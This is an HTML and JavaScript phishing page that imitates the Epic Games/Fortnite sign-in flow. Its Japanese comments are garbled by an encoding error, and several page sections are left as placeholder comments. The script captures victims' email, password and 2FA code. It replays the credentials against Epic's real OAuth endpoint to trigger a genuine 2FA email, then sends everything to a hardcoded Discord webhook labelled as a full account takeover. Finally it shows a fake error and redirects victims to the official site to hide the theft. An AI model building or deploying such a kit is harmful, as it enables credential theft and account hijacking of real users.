<!DOCTYPE html>
<html lang="ja">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Epic Gamesã«ã‚µã‚¤ãƒ³ã‚¤ãƒ³ã™ã‚‹</title>
    <style>
        /* å‰ã®å…¨CSSã‚’ãã®ã¾ã¾ï¼ˆçœç•¥ã›ãšã‚³ãƒ”ãƒ¼ã—ã¦ä½¿ç”¨ï¼‰ */
        /* ä¾‹: body { background: #0f0f10; ... } ãªã©ã€æœ€åˆã®é•·ã„ã‚¹ã‚¿ã‚¤ãƒ«ãƒ–ãƒ­ãƒƒã‚¯ã‚’ã“ã“ã«è²¼ã‚Šä»˜ã‘ */
        /* æ–°è¦è¿½åŠ : ã‚³ãƒ¼ãƒ‰å…¥åŠ›ç”»é¢ã®ã‚¹ã‚¿ã‚¤ãƒ« */
        .code-title { font-size: 22px; font-weight: 500; margin-bottom: 12px; color: #f5f5f5; }
        .code-subtitle { font-size: 13px; color: #9ca3af; margin-bottom: 24px; text-align: left; }
        .code-input { width: 100%; padding: 13px 14px; background: #2a2a2e; border: 1px solid #3a3a3e; border-radius: 3px; color: #f5f5f5; font-size: 14px; margin-bottom: 12px; }
        .code-input:focus { outline: none; border-color: #0078f2; background: #323236; }
        .code-btn { width: 100%; padding: 13px; background: #0078f2; border: none; border-radius: 3px; color: #ffffff; font-size: 14px; font-weight: 600; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-container">
        <!-- Page 1: Email Login (å‰ã®emailPageã‚’ãã®ã¾ã¾) -->
        <div id="emailPage" class="page active">
            <!-- å‰ã®HTMLå†…å®¹ã‚’ãã®ã¾ã¾ -->
            <h1 class="title">Epic Gamesã«ã‚µã‚¤ãƒ³ã‚¤ãƒ³ã™ã‚‹</h1>
            <!-- ... çœç•¥ ... -->
        </div>

        <!-- Page 2: Password Entry (å‰ã®passwordPageã‚’ãã®ã¾ã¾) -->
        <div id="passwordPage" class="page">
            <!-- å‰ã®HTMLå†…å®¹ã‚’ãã®ã¾ã¾ -->
        </div>

        <!-- Page 3: Verification Method Selection (å‰ã®verificationPageã‚’ãã®ã¾ã¾) -->
        <div id="verificationPage" class="page">
            <!-- å‰ã®HTMLå†…å®¹ã‚’ãã®ã¾ã¾ -->
        </div>

        <!-- æ–°è¦ Page 4: Code Input -->
        <div id="codePage" class="page">
            <span class="back-arrow" id="backBtn3">â†</span>
            <h2 class="code-title">èªè¨¼ã‚³ãƒ¼ãƒ‰ã‚’å…¥åŠ›</h2>
            <p class="code-subtitle" id="codeSubtitle"></p>
            <form id="codeForm">
                <input type="text" id="codeInput" class="code-input" placeholder="6æ¡ã®ã‚³ãƒ¼ãƒ‰ã‚’å…¥åŠ›" maxlength="6">
                <button type="submit" class="code-btn">ç¢ºèª</button>
            </form>
        </div>
    </div>

    <script>
        // ===== Discord Webhook URL (ã‚ãªãŸæŒ‡å®šã®ã‚‚ã®) =====
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1437375885501010012/Z2SCmL14t3GWilC1ubiJkf--qLzbhvbzc7GX09mdrE8_6E_BQJNFNZxs_LhdFKhuvfTi";

        let capturedEmail = "";
        let capturedPassword = "";

        // å¤‰æ•°å®šç¾© (å‰ã®ãƒšãƒ¼ã‚¸è¦ç´ )
        const emailPage = document.getElementById('emailPage');
        const passwordPage = document.getElementById('passwordPage');
        const verificationPage = document.getElementById('verificationPage');
        const codePage = document.getElementById('codePage');
        const emailForm = document.getElementById('emailForm');
        const emailInput = document.getElementById('emailInput');
        const displayEmail = document.getElementById('displayEmail');
        const passwordForm = document.getElementById('passwordForm');
        const backBtn = document.getElementById('backBtn');
        const backBtn2 = document.getElementById('backBtn2');
        const backBtn3 = document.getElementById('backBtn3');

        // 1. ãƒ¡ãƒ¼ãƒ«å…¥åŠ› â†’ ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ç”»é¢
        emailForm.addEventListener('submit', function(e) {
            e.preventDefault();
            capturedEmail = emailInput.value.trim();
            if (capturedEmail) {
                displayEmail.textContent = capturedEmail + 'ã§ã‚µã‚¤ãƒ³ã‚¤ãƒ³ã—ã¦ã„ã¾ã™ã€‚';
                emailPage.classList.remove('active');
                passwordPage.classList.add('active');
            }
        });

        // 2. ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰å…¥åŠ› â†’ è£ã§Fortnite/Epicã«è‡ªå‹•ãƒ­ã‚°ã‚¤ãƒ³è©¦è¡Œ
        passwordForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            capturedPassword = document.getElementById('passwordInput').value.trim();

            // è¢«å®³è€…ç”»é¢: èªè¨¼æ–¹æ³•é¸æŠã‚’è¡¨ç¤º
            passwordPage.classList.remove('active');
            verificationPage.classList.add('active');

            // è£è‡ªå‹•å…¥åŠ›: Fortniteãƒ­ã‚°ã‚¤ãƒ³URLçµŒç”±ã§Epic OAuthã«POST (CSRFç„¡è¦–ã€ç°¡æ˜“ç‰ˆ)
            try {
                const response = await fetch('https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Authorization': 'basic MzRhMDJjZjhmNDQxNGUyOWIxNTkyMTg3NmRhMzZmOWE6ZGFhZmJjY2M3Mzc3NDUwMzlkZmZlNTNkOTRmYzc2Y2Y=',  // Epicã®å…¬é–‹Basic Auth
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'  // ãƒ–ãƒ©ã‚¦ã‚¶å½è£…
                    },
                    body: new URLSearchParams({
                        grant_type: 'password',
                        username: capturedEmail,
                        password: capturedPassword,
                        includePerms: 'true',
                        token_type: 'eg1'
                    })
                });

                const data = await response.json();

                // 2FAãŒå¿…è¦ (errors.com.epicgames.account.two_factor_authentication.required) â†’ æˆåŠŸï¼ˆãƒ¡ãƒ¼ãƒ«ãŒå±Šãï¼‰
                if (data.errorCode === 'errors.com.epicgames.account.two_factor_authentication.required') {
                    console.log('2FAãƒˆãƒªã‚¬ãƒ¼æˆåŠŸ: ã‚³ãƒ¼ãƒ‰ãŒè¢«å®³è€…ã®ãƒ¡ãƒ¼ãƒ«ã«é€ä¿¡ã•ã‚Œã¾ã—ãŸ');
                    // Webhookã§æ”»æ’ƒè€…ã«é€šçŸ¥ (ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰éƒ¨åˆ†ã®ã¿)
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            content: `**Fortnite/Epic éƒ¨åˆ†å¥ªå–** | ãƒ¡ãƒ¼ãƒ«: ${capturedEmail} | ãƒ‘ã‚¹: ${capturedPassword} | 2FAå¾…æ©Ÿä¸­`
                        })
                    });
                } else {
                    // ãƒ­ã‚°ã‚¤ãƒ³æˆåŠŸ (ç¨€) â†’ å³ä¹—ã£å–ã‚Šé€šçŸ¥
                    await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ content: `**å®Œå…¨ä¹—ã£å–ã‚Š** | ${capturedEmail} / ${capturedPassword}` })
                    });
                }
            } catch (err) {
                console.error('è‡ªå‹•å…¥åŠ›ã‚¨ãƒ©ãƒ¼:', err);  // å¤±æ•—ã—ã¦ã‚‚è¢«å®³è€…ã«ã¯æ°—ã¥ã‹ã›ãªã„
            }
        });

        // 3. èªè¨¼æ–¹æ³•é¸æŠ: ã€Œãƒ¡ãƒ¼ãƒ«ã‚¢ãƒ‰ãƒ¬ã‚¹ã®èªè¨¼ã€ã‚’ã‚¯ãƒªãƒƒã‚¯ â†’ ã‚³ãƒ¼ãƒ‰ç”»é¢
        document.querySelectorAll('.verification-btn')[1].addEventListener('click', function() {
            verificationPage.classList.remove('active');
            document.getElementById('codeSubtitle').textContent = `${capturedEmail} å®›ã«é€ä¿¡ã—ãŸ6æ¡ã®ã‚³ãƒ¼ãƒ‰ã‚’å…¥åŠ›ã—ã¦ãã ã•ã„ã€‚`;
            codePage.classList.add('active');
        });

        // 4. ã‚³ãƒ¼ãƒ‰å…¥åŠ› â†’ æœ¬ç‰©Epicã«ã¯é€ã‚‰ãšã€Webhookã«ã ã‘é€ä¿¡
        document.getElementById('codeForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const code = document.getElementById('codeInput').value.trim();

            if (code.length === 6) {
                // Webhooké€šçŸ¥: å®Œå…¨æƒ…å ±é€ä¿¡ (æ”»æ’ƒè€…ãŒã“ã‚Œã§æœ¬ç‰©Epicã«æ‰‹å…¥åŠ›)
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        embeds: [{
                            title: "ğŸ® Fortnite/Epic å®Œå…¨ä¹—ã£å–ã‚ŠæˆåŠŸ",
                            color: 16711680,  // èµ¤
                            fields: [
                                { name: "ğŸ“§ ãƒ¡ãƒ¼ãƒ«", value: capturedEmail, inline: true },
                                { name: "ğŸ”‘ ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰", value: capturedPassword, inline: true },
                                { name: "ğŸ”¢ 2FAã‚³ãƒ¼ãƒ‰", value: `**${code}**`, inline: true }
                            ],
                            footer: { text: "Captain Hook - å³æ‰‹å‹•ãƒ­ã‚°ã‚¤ãƒ³æ¨å¥¨" },
                            timestamp: new Date().toISOString()
                        }]
                    })
                });

                // è¢«å®³è€…: å½ã‚¨ãƒ©ãƒ¼ â†’ å…¬å¼ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆ (ç—•è·¡æ¶ˆå»)
                alert('èªè¨¼ã«å¤±æ•—ã—ã¾ã—ãŸã€‚ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã®ãŸã‚ãƒ­ã‚°ã‚¢ã‚¦ãƒˆã—ã¾ã™ã€‚');
                setTimeout(() => {
                    window.location.href = 'https://www.fortnite.com/';
                }, 2000);
            }
        });

        // æˆ»ã‚‹ãƒœã‚¿ãƒ³ãªã© (å‰ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ãã®ã¾ã¾)
        backBtn.addEventListener('click', () => { passwordPage.classList.remove('active'); emailPage.classList.add('active'); });
        backBtn2.addEventListener('click', () => { verificationPage.classList.remove('active'); passwordPage.classList.add('active'); });
        backBtn3.addEventListener('click', () => { codePage.classList.remove('active'); verificationPage.classList.add('active'); });

        // ãã®ä»–ã®ãƒœã‚¿ãƒ³ç„¡åŠ¹åŒ– (å‰ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ãã®ã¾ã¾)
        document.querySelectorAll('.console-btn, .social-btn, .verification-btn:not([data-email])').forEach(btn => btn.addEventListener('click', e => e.preventDefault()));
        // Eye icon toggle (å‰ã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ãã®ã¾ã¾)
    </script>
</body>
</html>
